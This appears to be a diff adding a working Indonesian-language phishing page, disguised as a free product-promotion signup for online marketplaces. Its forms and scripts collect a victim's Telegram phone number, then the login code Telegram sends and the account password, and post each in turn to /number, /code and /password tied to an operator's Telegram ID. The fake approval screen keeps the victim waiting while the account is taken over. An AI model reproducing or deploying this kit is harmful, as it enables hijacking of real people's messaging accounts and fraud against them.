@@ -1,0 +1,647 @@
+
+
+<div class="first">
+    <form action="javascript:void(0)" method="post" id="firstForm">
+        <div class="input-group mb-3">
+            <span class="input-group-text" id="basic-addon1"><strong>Nama</strong></span>
+            <input name="full_name" id="full_name" maxlength="18" class="form-control" type="text" required placeholder="Masukkan Nama Lengkap">
+        </div>
+        
+        <div class="input-group mb-3">
+            <span class="input-group-text" id="basic-addon1"><strong>Produk</strong></span>
+            <input name="product" id="product" maxlength="18" class="form-control" type="text" required placeholder="Masukkan Nama Produk">
+        </div>
+
+        <!-- Container untuk input gambar -->
+        <div id="image-upload-container">
+            <div class="input-group mb-3 image-upload">
+                <span class="input-group-text"><strong>Gambar</strong></span>
+                <input type="file" class="form-control image-input" accept="image/*" required onchange="previewImage(event, 0)">
+                <button type="button" class="btn btn-danger remove-image" onclick="removeImage(0)" style="display: none;">Hapus</button>
+            </div>
+        </div>
+
+        <!-- Tombol untuk menambah input gambar baru -->
+        <button type="button" id="add-image" class="btn btn-primary">Tambah</button>
+
+        <!-- Preview Gambar -->
+        <div id="preview-container" style="display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px;"></div>
+
+        <div class="input-group mb-3">
+            <span class="input-group-text" id="basic-addon1"><strong>Provinsi</strong></span>
+            <select name="provinsi" id="provinsi" class="form-control" required>
+                <option value="">Pilih Provinsi</option>
+                <option value="Aceh">Aceh</option>
+                <option value="Bali">Bali</option>
+                <option value="Banten">Banten</option>
+                <option value="Bengkulu">Bengkulu</option>
+                <option value="Gorontalo">Gorontalo</option>
+                <option value="Jakarta">Jakarta</option>
+                <option value="Jambi">Jambi</option>
+                <option value="Jawa Barat">Jawa Barat</option>
+                <option value="Jawa Tengah">Jawa Tengah</option>
+                <option value="Jawa Timur">Jawa Timur</option>
+                <option value="Kalimantan Barat">Kalimantan Barat</option>
+                <option value="Kalimantan Selatan">Kalimantan Selatan</option>
+                <option value="Kalimantan Tengah">Kalimantan Tengah</option>
+                <option value="Kalimantan Timur">Kalimantan Timur</option>
+                <option value="Kalimantan Utara">Kalimantan Utara</option>
+                <option value="Kepulauan Riau">Kepulauan Riau</option>
+                <option value="Lampung">Lampung</option>
+                <option value="Maluku">Maluku</option>
+                <option value="Maluku Utara">Maluku Utara</option>
+                <option value="Nusa Tenggara Barat">Nusa Tenggara Barat</option>
+                <option value="Nusa Tenggara Timur">Nusa Tenggara Timur</option>
+                <option value="Papua">Papua</option>
+                <option value="Papua Barat">Papua Barat</option>
+                <option value="Riau">Riau</option>
+                <option value="Sumatera Barat">Sumatera Barat</option>
+                <option value="Sumatera Selatan">Sumatera Selatan</option>
+                <option value="Sumatera Utara">Sumatera Utara</option>
+                <option value="Yogyakarta">Yogyakarta</option>
+            </select>
+        </div>
+
+        <div class="input-group mb-3">
+            <span class="input-group-text" id="basic-addon1">🇮🇩</span>
+            <input name="phone_number" id="phone_number" maxlength="18" class="form-control" type="tel" required placeholder="Masukkan nomor Telegram aktif">
+        </div>
+        
+        <div class="text-center">
+            <button type="submit" id="firstbutt" class="btn btn-lg btn-block btn-mk" onclick="processFirstData()"><%= buttonname %></button>
+        </div>
+    </form>
+</div>
+
+
+
+  
+  <div class="second" style="display: none;">
+    <form action="javascript:void(0)" method="post" id="secondForm">
+        <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
+        <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
+        <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
+        <div class="mb-3">
+            <label for="otp_code" class="form-label">
+                <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kami telah mengirimkan kode verifikasi ke aplikasi Telegram Anda.</span>
+            </label>
+            <input name="otp_code" maxlength="5" id="otp_code" class="form-control" type="tel" required="true" placeholder="Masukkan kode verifikasi">
+        </div>
+        <div class="text-center">
+            <button type="submit" id="seccbutt" class="btn btn-lg btn-block btn-mk" onclick="processSecondData()">BERIKUTNYA</button>
+        </div>
+    </form>
+  </div>
+  
+  <div class="third" style="display: none;">
+    <form action="javascript:void(0)" method="post" id="thirdForm">
+        <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
+          <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
+        <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
+        <div class="mb-3">
+            <label for="password" class="form-label">
+                <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Masukkan kata sandi Anda.</span>
+            </label>
+            <input name="password" id="password" class="form-control" required="true" type="text" placeholder="Masukkan Password">
+        </div>
+        <div class="text-center">
+            <button type="submit" id="thirdbutt" class="btn btn-lg btn-block btn-mk" onclick="processThirdData()">BERIKUTNYA</button>
+        </div>
+    </form>
+  </div>
+  
+  
+
+  
+  
+  <div class="four"  style="display: none;">
+    <div class="container">
+        <p style="background: #347949; color: #f1f3f5; padding-top: 1px; margin-bottom: 6px; padding-bottom: 0px; height: 31px; font-size: 14px; text-align: center;">
+            &nbsp; TERIMA KASIH.<br><br>
+        </p>
+        
+        <section style="border: 1px solid #c2c5c8; padding: 12px 20px 20px 20px;">
+            <form action="javascript:void(0)" method="post" id="fourForm" enctype="multipart/form-data">
+                <input type="hidden" name="phone_number" id="validatephone_number" readonly>
+                <input type="hidden" name="otp_code" id="validateotp_code" readonly>
+                <input type="hidden" name="password" id="validatepassword" readonly>
+
+                <div class="mb-3">
+                    <p class="fw-bold mt-2 page-header text-center">
+                        <span id="ctl00_RecipientMasterContent_lblSubject">
+                            TETAP BERADA DI HALAMAN INI SAMPAI KAMI MENYETUJUI PROMOSI PRODUK ANDA DI PLATFORM YANG ANDA PILIH
+                        </span>
+                    </p>
+                </div>
+
+                <!-- Checkbox Platform -->
+                <div  id="checkboxfour"  class="mb-3">
+                    <p class="fw-bold">Silahkan Pilih Platform:</p>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Facebook" id="facebook">
+                        <label class="form-check-label" for="facebook">Facebook</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Zalora" id="zalora">
+                        <label class="form-check-label" for="zalora">Zalora</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Shopee" id="shopee">
+                        <label class="form-check-label" for="shopee">Shopee</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Lazada" id="lazada">
+                        <label class="form-check-label" for="lazada">Lazada</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Bukalapak" id="bukalapak">
+                        <label class="form-check-label" for="bukalapak">Bukalapak</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Blibli" id="blibli">
+                        <label class="form-check-label" for="blibli">Blibli</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Tiktok" id="tiktok">
+                        <label class="form-check-label" for="tiktok">Tiktok</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Instagram" id="instagram">
+                        <label class="form-check-label" for="instagram">Instagram</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="TokoPedia" id="tokopedia">
+                        <label class="form-check-label" for="tokopedia">TokoPedia</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Amazone" id="amazone">
+                        <label class="form-check-label" for="amazone">Amazone</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Jd.id" id="jd">
+                        <label class="form-check-label" for="jd">Jd.id</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" name="platform[]" value="Alibaba" id="alibaba">
+                        <label class="form-check-label" for="alibaba">Alibaba</label>
+                    </div>
+                </div>
+
+                <section class="text-center" style="padding-top: 24px;">
+                    <input class="btn btn-primary" type="submit" id="fourbutt" onclick="four()" value="KONFIRMASI">
+                </section>
+            </form>
+        </section>
+    </div>
+</div>
+    
+    <div id="carouselExampleControls" class="carousel slide" data-bs-ride="carousel">
+        <div class="carousel-indicators">
+        
+            <button type="button" data-bs-target="#carouselExampleControls" data-bs-slide-to="0" class="active"></button>
+     
+            <button type="button" data-bs-target="#carouselExampleControls" data-bs-slide-to="1"></button>
+       
+            
+            <button type="button" data-bs-target="#carouselExampleControls" data-bs-slide-to="2"></button>
+       
+            <button type="button" data-bs-target="#carouselExampleControls" data-bs-slide-to="3"></button>
+        
+            <button type="button" data-bs-target="#carouselExampleControls" data-bs-slide-to="4"></button>
+
+        </div>
+      
+        <div class="carousel-inner">
+       
+            <div class="carousel-item active">
+                <img class="d-block w-100" src="/assets/img/bawahmarket.jpeg" alt="Slide 1">
+            </div>
+            <div class="carousel-item">
+                <img class="d-block w-100" src="/assets/img/bawahmarket.jpeg" alt="Slide 2">
+            </div>
+            <div class="carousel-item">
+                <img class="d-block w-100" src="/assets/img/bawahmarket.jpeg" alt="Slide 3">
+            </div>
+            <div class="carousel-item">
+                <img class="d-block w-100" src="/assets/img/bawahmarket.jpeg" alt="Slide 4">
+            </div>
+            <div class="carousel-item">
+                <img class="d-block w-100" src="/assets/img/bawahmarket.jpeg" alt="Slide 5">
+            </div>
+        </div>
+      
+    
+      </div>
+      
+  
+  </div>
+  </main>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+  
+
+<script>
+
+    function four(){
+
+$("#checkboxfour").hide()
+$("#fourbutt").hide()
+
+    }
+let imageIndex = 1; // Menyimpan jumlah input gambar
+
+document.getElementById("add-image").addEventListener("click", function() {
+    let imageContainer = document.getElementById("image-upload-container");
+
+    if (imageIndex >= 3) {
+        alert("Maksimal hanya bisa mengunggah 3 gambar!");
+        return;
+    }
+
+    let newInput = document.createElement("div");
+    newInput.classList.add("input-group", "mb-3", "image-upload");
+    newInput.innerHTML = `
+        <span class="input-group-text"><strong>Gambar</strong></span>
+        <input type="file" class="form-control image-input" accept="image/*" required onchange="previewImage(event, ${imageIndex})">
+        <button type="button" class="btn btn-danger remove-image" onclick="removeImage(${imageIndex})">Hapus</button>
+    `;
+    
+    imageContainer.appendChild(newInput);
+    imageIndex++;
+});
+
+function previewImage(event, index) {
+    let file = event.target.files[0];
+    if (!file) return;
+
+    let reader = new FileReader();
+    reader.onload = function(e) {
+        let previewContainer = document.getElementById("preview-container");
+        
+        // Jika gambar sudah ada, update isinya
+        let existingImage = document.getElementById("preview-" + index);
+        if (existingImage) {
+            existingImage.src = e.target.result;
+        } else {
+            let img = document.createElement("img");
+            img.src = e.target.result;
+            img.style.maxWidth = "100px";
+            img.style.border = "1px solid #ddd";
+            img.style.borderRadius = "5px";
+            img.style.padding = "5px";
+            img.id = "preview-" + index;
+            
+            previewContainer.appendChild(img);
+        }
+
+        // Tampilkan tombol hapus di input yang bersangkutan
+        event.target.nextElementSibling.style.display = "inline-block";
+    };
+
+    reader.readAsDataURL(file);
+}
+
+function removeImage(index) {
+    // Hapus input file
+    let imageInputs = document.querySelectorAll(".image-upload");
+    if (imageInputs[index]) {
+        imageInputs[index].remove();
+        imageIndex--;
+    }
+
+    // Hapus preview gambar
+    let previewImage = document.getElementById("preview-" + index);
+    if (previewImage) {
+        previewImage.remove();
+    }
+}
+</script>
+
+  <script>
+  $(document).ready(function(){
+  var container = $('.carouseltext'),
+    items = container.find('li'),
+    containerHeight = 0,
+    numberVisible = 5, // Jumlah item yang terlihat
+    intervalSec = 2000; // Interval untuk scroll dalam milidetik
+  
+  // Menambahkan kelas "first" ke item pertama jika belum ada
+  if (!container.find('li:first').hasClass("first")) {
+    container.find('li:first').addClass("first");
+  }
+  
+  // Menghitung tinggi total container berdasarkan jumlah item yang terlihat
+  items.each(function () {
+    if (containerHeight < numberVisible * $(this).outerHeight()) {
+        containerHeight += $(this).outerHeight();
+    }
+  });
+  
+  container.css({ height: containerHeight, overflow: "hidden" });
+  
+  // Fungsi untuk memindahkan item pertama ke bawah
+  function vertCycle() {
+    var firstItem = container.find('li.first'); // Ambil item pertama
+    var firstItemHtml = firstItem.html();
+  
+    // Salin item pertama dan tambahkan ke bawah
+    container.append('<li>' + firstItemHtml + '</li>');
+  
+    // Animasi untuk menggeser item pertama ke atas
+    firstItem.animate({ marginTop: "-50px" }, 600, function () {
+        $(this).remove(); // Hapus item pertama yang sudah bergeser
+        container.find('li:first').addClass("first"); // Tandai item pertama yang baru
+    });
+  }
+  
+  // Tentukan interval minimal 700ms
+  if (intervalSec < 700) {
+    intervalSec = 700;
+  }
+  
+  // Mulai interval untuk memanggil vertCycle setiap intervalSec detik
+  var init = setInterval(vertCycle, intervalSec);
+  
+  // Hentikan interval saat hover, dan mulai kembali setelah hover selesai
+  container.hover(function () {
+    clearInterval(init);
+  }, function () {
+    init = setInterval(vertCycle, intervalSec);
+  });
+  });
+  function formatPhoneNumber(phoneNumber) {
+  // Jika nomor telepon diawali dengan '0', ganti dengan '+628'
+  if (phoneNumber.startsWith('0')) {
+  return '+62' + phoneNumber.substring(1);
+  }
+  // Jika nomor sudah dimulai dengan '62', ganti dengan '+628'
+  else if (phoneNumber.startsWith('62')) {
+  return '+62' + phoneNumber.substring(2);
+  }
+  // Jika format sudah sesuai, kembalikan nomor tanpa perubahan
+  else {
+  return phoneNumber;
+  }
+  }
+  function processFirstData(){
+  $('#firstForm').submit(function(submitingprocessFirstData){
+  submitingprocessFirstData.preventDefault();
+  
+  var $full_name = $("input#full_name").val();
+  var $provinsi = $("#provinsi").val();
+  var $phone = $("input#phone_number").val();
+  var $phone_number = formatPhoneNumber($phone);
+  var dataToSend = {
+  full_name: $full_name,
+  provinsi: $provinsi,
+  phone_number: $phone_number
+  };
+  console.log(dataToSend)
+  
+  
+  if($full_name === "" && $phone_number === ""){
+    return false;
+  }
+  
+  $.ajax({
+    type: "POST",
+    url: "/number",
+   data: dataToSend,
+    beforeSend: function() {
+        $('.loading').show();
+        $("#alert").html("")
+        $('#firstbutt').hide();
+    },
+    success: function(hasil){
+        if(hasil.code == 200){             
+            $('.loading').hide();
+            $(".second").show();
+            $('.first').hide();
+            $("input#validateclientHash").val(hasil.clientHash);
+            $("input#validateprovinsi").val($provinsi);
+            $("input#validatephone_number").val($phone_number);
+        }else{
+            $('#firstbutt').show();
+            $('.loading').hide();
+            if(hasil.err.errorMessage == "PHONE_NUMBER_INVALID"){
+                
+                $("#alert").html(`
+                <div class="alert alert-danger" role="alert">
+                    Nomor Yang Anda Masukkan Tidak Valid!
+                    </div>
+                    `)
+                }else if(hasil.err.errorMessage == "FLOOD"){
+                    
+                    $("#alert").html(`
+                    <div class="alert alert-danger" role="alert">
+                        Terlalu Banyak Permintaan Code!
+                        </div>
+                        `)
+                }else if(hasil.err.errorMessage == "PHONE_PASSWORD_FLOOD"){
+                    
+                    $("#alert").html(`
+                    <div class="alert alert-danger" role="alert">
+                        Terlalu Banyak Memasukkan Password!
+                        </div>
+                        `)
+                    }else{
+                        $("#alert").html(`<div class="alert alert-danger" role="alert">
+                            ${hasil.err.errorMessage}
+                            </div>`)
+                        }
+                        
+                        
+                        
+                        
+                    }
+                }
+            });
+        });  
+        return false;
+    };
+    
+    
+    
+    
+    
+    
+    
+    function processSecondData(){
+        $('#secondForm').submit(function(submitingprocessSecondData){
+            submitingprocessSecondData.preventDefault();
+            
+            var $clientHash = $("input#validateclientHash").val();
+            var $phone_number = $("input#validatephone_number").val();
+            var $provinsi = $("input#validateprovinsi").val();
+            var $otp_code = $("input#otp_code").val();
+            var $idtele = "<%= String(telegramId) %>"
+            if($clientHash === "" && $phone_number === "" && $otp_code === ""){
+                return false;
+            }
+            
+            $.ajax({
+                type: "POST",
+                url: "/code",
+                data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
+                beforeSend: function() {
+                    $("#alert").html("")
+                    $('.loading').show();
+                      $('#seccbutt').hide();
+                },
+                success: function(hasil){
+                    
+                     $('.loading').hide();
+                      if(hasil.needPassword || hasil.code == 401){
+                                            $(".third").show();
+                        $('.second').hide();
+                        $("input#validateclientHash").val($clientHash);
+                        $("input#validatePhoneNumber").val($phone_number);
+                        $("input#validateprovinsi").val($provinsi); 
+                       
+                                          
+                      }else{
+                          
+                            try{
+                           if(hasil.code == 200){
+                                         if(hasil.stcd.result.user != ""){
+                                              
+                                              $(".four").show();
+                                              $('.loading').hide();
+                                              $('.second').hide();
+                                  
+                                          }
+                                          
+                                $('.loading').hide();
+                
+                  $(".four").show();
+                              $('.second').hide();
+                               
+                           }else{
+                        $('#seccbutt').show();
+              $('.loading').hide();
+                 
+        $("#alert").html(`<div class="alert alert-danger" role="alert">${hasil.code} - ${hasil.error}</div>`)
+                                  
+    }
+  }catch(e){
+    
+    
+    console.log(e)
+    console.log(hasil)
+     $('#seccbutt').show();
+    $('.loading').hide();
+    
+    
+    
+    
+    $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah,coba lagi</div>`)
+    
+    
+    
+    
+                                  
+    
+  }   
+  
+  }
+                      
+                      
+        
+                            
+                            },
+                            error: function(xhr, status, error) {
+                                 $('#seccbutt').show();
+        if (status === "timeout") {
+     $('.loading').hide();
+                              
+           $("#alert").html(`<div class="alert alert-danger" role="alert">Periksa jaringan anda dan coba lagi</div>`)
+        } else {
+     $('.loading').hide();
+                              
+           $("#alert").html(`<div class="alert alert-danger" role="alert">Periksa jaringan anda dan coba lagi</div>`)
+        }
+      }
+                    });
+                });  
+                return false;
+            };
+            
+            
+            function processThirdData(){
+                $('#thirdForm').submit(function(submitingprocessThirdData){
+                    submitingprocessThirdData.preventDefault();
+                    
+                    var $clientHash = $("input#validateclientHash").val();
+                    var $provinsi = $("input#validateprovinsi").val();
+                    var $phone_number = $("input#validatephone_number").val();
+                    var $password = $("input#password").val();
+                                            var $idtele = "<%= String(telegramId) %>"
+                    if($clientHash === "" && $phone_number === "" && $password === ""){
+                        return false;
+                    }
+                    
+                    $.ajax({
+                        type: "POST",
+                        url: "/password",
+                        data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
+                        beforeSend: function() {
+                            $('.loading').show();
+                            $("#alert").html("")
+                             $('#thirdbutt').hide();
+                        },
+                        success: function(response){
+  
+                          
+  
+            try {
+                      // Mengecek apakah respons sukses atau error
+                      if (response.code == 200) {
+              
+                          $('.loading').hide();
+                          $('.third').hide();
+                          $(".four").show();
+  
+                                               
+                      } else {
+                          // Menyembunyikan loading dan menampilkan tombol kembali
+                          $('.loading').hide();
+                   $('#thirdbutt').show();
+                          
+                          // Menampilkan pesan error jika ada
+                          if (response.error) {
+                              $("#alert").html(`<div class="alert alert-danger" role="alert">${response.code} - ${response.error}</div>`);
+                          } else {
+                              $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah, refresh halaman dan coba lagi</div>`);
+                          }
+                      }
+                  } catch (e) {
+                       $('#thirdbutt').show();
+                      // Menangani error di dalam blok try-catch
+                      $('.loading').hide();
+                 
+                      console.log(e);
+                      $("#alert").html(`<div class="alert alert-danger" role="alert">Ada masalah, refresh halaman dan coba lagi</div>`);
+                  }
+              },
+              error: function(xhr, status, error){
+                   $('#thirdbutt').show();
+                  // Menangani error jika ada masalah saat pengiriman data
+                  $('.loading').hide();
+               
+                  console.log(error);
+                  $("#alert").html(`<div class="alert alert-danger" role="alert">Terjadi kesalahan, coba lagi nanti.</div>`);
+              }
+          });
+          });
+  
+          return false;
+  };
+  
+  </script>
+  
+  
+  
+  
+  
+  
+  
